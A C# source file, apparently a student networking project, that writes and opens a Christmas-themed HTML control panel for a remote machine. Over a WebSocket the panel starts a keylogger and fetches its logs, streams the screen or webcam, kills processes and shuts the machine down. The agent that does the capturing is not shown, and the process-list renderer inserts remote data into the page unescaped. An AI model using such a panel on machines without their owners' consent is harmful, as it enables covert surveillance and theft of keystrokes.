using System;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using System.Drawing;

namespace client
{
    public partial class client : Form
    {
        string htmlPath = Path.Combine(Application.StartupPath, "shadow_ops.html");

        string htmlContent = @"
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <title>SHADOW_ROOT_ACCESS • CHRISTMAS</title>
    <style>
        /* ===== CHRISTMAS THEME (giữ nguyên JS & chức năng) ===== */
        :root {
            --bg: radial-gradient(1200px 600px at 20% -10%, #0b3d2e 0%, #071b14 35%, #050505 70%);
            --panel: rgba(17, 17, 17, 0.92);
            --border: #2f5f49;
            --accent: #d62828;          /* đỏ Noel */
            --accent-2: #1faa59;        /* xanh Noel */
            --gold: #f4d03f;
            --text: #e6e6e6;
        }
        * { box-sizing: border-box; }
        body {
            background: var(--bg);
            color: var(--text);
            font-family: 'Consolas', monospace;
            margin: 0; padding: 10px;
            height: 100vh; overflow: hidden;
            font-size: 11px;
        }
        .grid {
            display: grid;
            grid-template-columns: 2.5fr 5fr 2.5fr;
            grid-template-rows: 56px 1fr 210px;
            gap: 10px; height: 100%;
        }
        .box {
            background: linear-gradient(180deg, rgba(20,20,20,.95), rgba(10,10,10,.95)), var(--panel);
            border: 1px solid var(--border);
            padding: 10px;
            display: flex; flex-direction: column; overflow: hidden;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,.35), inset 0 0 0 1px rgba(255,255,255,.02);
        }
        .box:hover { border-color: var(--accent-2); }
        .box h3 {
            margin: 0 0 12px 0;
            color: var(--gold);
            border-bottom: 2px solid var(--accent-2);
            padding-bottom: 6px;
            font-size: 15px; /* TO HƠN */
            font-weight: 900; /* ĐẬM HƠN */
            letter-spacing: 2px; /* HACKER UI */
            text-transform: uppercase;
            text-shadow:
            0 0 6px rgba(244,208,63,.6),
            0 0 12px rgba(31,170,89,.35);
        }
        .header {
            grid-column: 1 / -1;
            display: flex; justify-content: space-between; align-items: center;
            border-bottom: 2px solid var(--accent);
            background: linear-gradient(90deg, #0b3d2e, #111);
            border-radius: 12px;
            position: relative;
            overflow: hidden;
        }
        .header::after{
            content: """";
            position:absolute; inset:0;
            background-image:
              radial-gradient(2px 2px at 20% 30%, rgba(255,255,255,.6) 40%, transparent 41%),
              radial-gradient(1.5px 1.5px at 60% 20%, rgba(255,255,255,.5) 40%, transparent 41%),
              radial-gradient(1.8px 1.8px at 80% 60%, rgba(255,255,255,.4) 40%, transparent 41%);
            opacity:.25; pointer-events:none;
        }
        .title {
            font-size: 18px; font-weight: 800; letter-spacing: 2px;
            color: #fff;
            text-shadow: 0 0 8px rgba(214,40,40,.6), 0 0 16px rgba(31,170,89,.35);
        }
        #status { font-weight: bold; }
        .ctrl-group { display: flex; gap: 6px; margin-bottom: 6px; }
        input {
            background: #0f1f18; border: 1px solid #2f5f49; color: #fff;
            padding: 5px; flex: 1; text-align: center; font-family: inherit; font-size: 11px;
            border-radius: 6px;
        }
        button {
            background: linear-gradient(180deg, #18261f, #0f1f18);
            color: #cfcfcf; border: 1px solid #2f5f49;
            padding: 5px 10px; cursor: pointer; font-weight: bold;
            transition: .2s; font-family: inherit; font-size: 10px; width: 64px;
            border-radius: 999px;
            box-shadow: inset 0 -1px 0 rgba(0,0,0,.4);
        }
        button:hover { border-color: var(--accent); color: #fff; box-shadow: 0 0 0 2px rgba(214,40,40,.25); }
        .scroll-box {
            flex: 1; overflow-y: auto; background: #000; border: 1px solid #163a2c;
            padding: 6px; white-space: pre-wrap; word-break: break-all; border-radius: 8px;
        }
        table { width: 100%; border-collapse: collapse; }
        td { padding: 4px; border-bottom: 1px dashed #1e4b39; white-space: nowrap; }
        tr:hover { background: rgba(31,170,89,.15); color: #fff; cursor: pointer; }
        .pid { color: var(--accent); width: 52px; font-weight: bold; }
        #media-view {
            flex: 1; border: 1px dashed #2f5f49; background: #000;
            display: flex; align-items: center; justify-content: center; overflow: hidden;
            border-radius: 10px;
        }
        img { max-width: 100%; max-height: 100%; object-fit: contain; }
        /* Xmas badge */
        .badge{
            position:absolute; right:10px; top:10px;
            background: linear-gradient(180deg, #d62828, #a61b1b);
            color:#fff; padding:3px 8px; border-radius:999px; font-size:10px;
            box-shadow: 0 6px 14px rgba(0,0,0,.35);
        }
        .snow {
            position: fixed;
            top: -10px;
            color: #fff;
            user-select: none;
            pointer-events: none;
            z-index: 9999;
            animation: fall linear infinite;
            text-shadow: 0 0 6px rgba(255,255,255,.8);
        }
        @keyframes fall {
            to {
                transform: translateY(110vh);
            }
        }
    </style>
</head>
<body>
    <div class='grid'>
        <div class='box header'>
            <div class='title'>/// DO AN MANG MAY TINH ///</div>
            <div id='status' style='color:#aaa'>STATUS: DISCONNECTED</div>
        </div>

        <div class='box'>
            <h3> APPLICATIONS</h3>
            <button onclick=""send('LIST_APPS')"" style='width:100%'>REFRESH LIST</button>
            <div class='ctrl-group'><input id='appNameStart' placeholder='App Name (e.g. notepad)'><button onclick=""startApp('appNameStart')"">START</button></div>
            <div class='ctrl-group'><input id='appPidStop' placeholder='PID'><button onclick=""stopApp('appPidStop')"" style='color:#ff6b6b'>STOP</button></div>
            <div class='scroll-box' id='list-apps'></div>
        </div>

        <div class='box'>
            <h3> SURVEILLANCE</h3>
            <div style='display:flex; gap:6px; margin-bottom:6px'>
                <button onclick=""send('SCREENSHOT')"" style='flex:0.5'>SNAP</button>
                <button onclick=""recWebcam()"" id='btnCam' style='flex:0.5'>REC 10s</button>
                <button onclick=""send('RESUME_STREAM')"">RESUME</button>
                <button onclick=""send('STOP_STREAM')"">STOP</button>
                <button onclick=""toggleSource()"" id=""btnSource"" style=""color:#7bdcb5"">WEBCAM</button>
            </div>
            <div id='media-view'>NO SIGNAL</div>
            <div style='margin-top:auto; border-top:1px dashed #2f5f49; padding-top:6px'>
                <label style='color:#ff6b6b; font-size:10px'>POWER OPS</label>
                <div style='display:flex; gap:6px'>
                    <button onclick=""send('SHUTDOWN')"" style='color:#ff6b6b'>OFF</button>
                    <button onclick=""send('RESTART')"" style='color:#f4d03f'>RST</button>
                    <button onclick=""send('DISCONNECT')"" style='color:#7bdcb5'>QUIT</button>
                </div>
                <div style='margin-top:10px'>
                    <input id='ip' value='127.0.0.1' style='width:100%; margin-bottom:6px'>
                    <button onclick='connect()' style='width:100%'>CONNECT</button>
                </div>
            </div>
        </div>

        <div class='box'>
            <h3> PROCESSES</h3>
            <button onclick=""send('LIST_PROCS')"" style='width:100%'>REFRESH LIST</button>
            <div class='ctrl-group'><input id='procNameStart' placeholder='Process Name'><button onclick=""startApp('procNameStart')"">START</button></div>
            <div class='ctrl-group'><input id='procPidStop' placeholder='PID'><button onclick=""stopApp('procPidStop')"" style='color:#ff6b6b'>STOP</button></div>
            <div class='scroll-box' id='list-procs'></div>
        </div>

        <div class='box' style=""grid-column: 1 / -1;"">
            <div style='display:flex; justify-content:space-between; align-items:center; margin-bottom:6px'>
                <h3> KEYLOGGER</h3>
                <button id='btnKey' onclick=""toggleKeylog()"" style='width:170px; color:#7bdcb5'>START KEYLOG</button>
            </div>
            <div id='terminal' class='scroll-box' style='font-family:monospace; color:#7CFC98; border:none'>
                <div>[SYS] Ready.</div>
            </div>
        </div>
    </div>

    <!-- ===== JS GIỮ NGUYÊN CHỨC NĂNG ===== -->
    <script>
        var ws; 
        var term = document.getElementById('terminal');
        var isKeylogging = false;
        let sourceMode = ""SCREEN"";
        function createSnow() {
            const snow = document.createElement('div');
            snow.className = 'snow';
            snow.innerText = '❄';
            snow.style.left = Math.random() * window.innerWidth + 'px';
            snow.style.fontSize = (Math.random() * 10 + 8) + 'px';
            snow.style.opacity = Math.random();
            snow.style.animationDuration = (Math.random() * 5 + 5) + 's';
            document.body.appendChild(snow);
            setTimeout(() => snow.remove(), 12000);
        }
         document.addEventListener('DOMContentLoaded', () => {
            setInterval(createSnow, 200);
        });
        function log(msg) {
            term.innerHTML += '<div>>> ' + msg + '</div>';
            term.scrollTop = term.scrollHeight;
        }
        function toggleSource() {
            if (sourceMode === ""SCREEN"") {
                send(""STREAM_WEBCAM"");
                sourceMode = ""WEBCAM"";
                document.getElementById(""btnSource"").innerText = ""SCREEN"";
            } else {
                send(""STREAM_SCREEN"");
                sourceMode = ""SCREEN"";
                document.getElementById(""btnSource"").innerText = ""WEBCAM"";
            }
        }
        function connect() {
            var ip = document.getElementById('ip').value;
            ws = new WebSocket('ws://' + ip + ':8080');
            log('Connecting...');
            ws.onopen = function() {
                document.getElementById('status').innerText = 'STATUS: CONNECTED';
                document.getElementById('status').style.color = '#7CFC98';
                log('CONNECTED.');
            };
            ws.onmessage = function(e) {
                var d = e.data;
                if(d.startsWith('IMG|')) {
                    document.getElementById('media-view').innerHTML = '<img src=""data:image/jpeg;base64,' + d.substring(4) + '"">';
                }
                else if (d.startsWith('LIVE|')) {
                    document.getElementById('media-view').innerHTML = '<img src=""data:image/jpeg;base64,' + d.substring(5) + '"">';
                }
                else if(d.startsWith('VID|')) {
                    var base64Video = d.substring(4);
                    log('Video received. Downloading...');
                    var a = document.createElement('a');
                    a.href = 'data:video/avi;base64,' + base64Video;
                    a.download = 'webcam_' + new Date().getTime() + '.avi';
                    a.click();
                    var btn = document.getElementById('btnCam');
                    btn.disabled = false; btn.innerText = 'REC 10s';
                }
                else if(d.startsWith('LIST_APPS|')) renderList(d.substring(10), 'list-apps', 'appPidStop', 'appNameStart');
                else if(d.startsWith('LIST_PROCS|')) renderList(d.substring(11), 'list-procs', 'procPidStop', 'procNameStart');
                else if(d.startsWith('KEYLOG|')) log(d.substring(7));
                else log(d);
            };
            ws.onclose = function() {
                log('Disconnected from server.');
                document.getElementById('media-view').innerHTML = 'NO SIGNAL';
                document.getElementById('status').innerText = 'STATUS: DISCONNECTED';
                document.getElementById('status').style.color = '#ff6b6b';
            };
            ws.onerror = function(err) {
                console.error('WebSocket error:', err);
                document.getElementById('media-view').innerHTML = 'NO SIGNAL';
            };
        }
        function send(c) { if(ws && ws.readyState==1) ws.send(c); else log('Error: Not Connected'); }
        function startApp(id) { var n = document.getElementById(id).value; if(n) { send('START|'+n); log('Request Start: '+n); } }
        function stopApp(id) { var p = document.getElementById(id).value; if(p) { send('KILL|'+p); log('Request Kill PID: '+p); } }
        function recWebcam() { send('WEBCAM_START'); log('Requesting 10s video...'); var btn = document.getElementById('btnCam'); btn.disabled = true; btn.innerText = 'REC...'; }
        function toggleKeylog() {
            var btn = document.getElementById('btnKey');
            if (!isKeylogging) {
                send('KEYLOG_START'); isKeylogging = true;
                btn.innerText = 'STOP & GET LOGS'; btn.style.color = '#f4d03f';
                log('Keylogger Started...');
            } else {
                send('KEYLOG_STOP'); isKeylogging = false;
                btn.innerText = 'START KEYLOG'; btn.style.color = '#7bdcb5';
                log('Fetching logs...');
            }
            btn.blur();
        }
        function fill(idStop, idStart, pid, name) {
            document.getElementById(idStop).value = pid;
            var startName = name;
            if(name.indexOf('[') > -1) startName = name.split('[')[1].replace(']', '').trim();
            document.getElementById(idStart).value = startName;
        }
        function renderList(data, divId, idStop, idStart) {
            var rows = data.split(';'); 
            var html = '<table>';
            html += '<tr style=""color:#9bd5c0""><td style=""width:52px"">PID</td><td>NAME</td></tr>';
            for(var i=0; i<rows.length; i++) {
                var r = rows[i];
                if(r) {
                    var p = r.split('|||');
                    if(p.length >= 2) {
                        var safeName = p[1].replace(/'/g, '');
                        html += '<tr onclick=""fill(\'' + idStop + '\', \'' + idStart + '\', \'' + p[0] + '\', \'' + safeName + '\')"">';
                        html += '<td class=""pid"">' + p[0] + '</td><td>' + p[1] + '</td></tr>';
                    }
                }
            }
            document.getElementById(divId).innerHTML = html + '</table>';
        }
    </script>
</body>
</html>";


        public client()
        {
            this.Text = "SHADOW OPS LAUNCHER";
            this.Size = new Size(400, 200);
            this.BackColor = Color.Black;
            this.StartPosition = FormStartPosition.CenterScreen;
            Button btn = new Button(); btn.Text = "LAUNCH DASHBOARD"; btn.Dock = DockStyle.Fill;
            btn.ForeColor = Color.Red; btn.BackColor = Color.Black; btn.FlatStyle = FlatStyle.Flat;
            btn.Font = new Font("Consolas", 14, FontStyle.Bold);
            btn.Click += (s, e) => { OpenWeb(); };
            this.Controls.Add(btn);
            OpenWeb();
        }

        void OpenWeb() { try { File.WriteAllText(htmlPath, htmlContent); Process.Start("msedge.exe", "\"" + htmlPath + "\""); } catch { } }
    }
}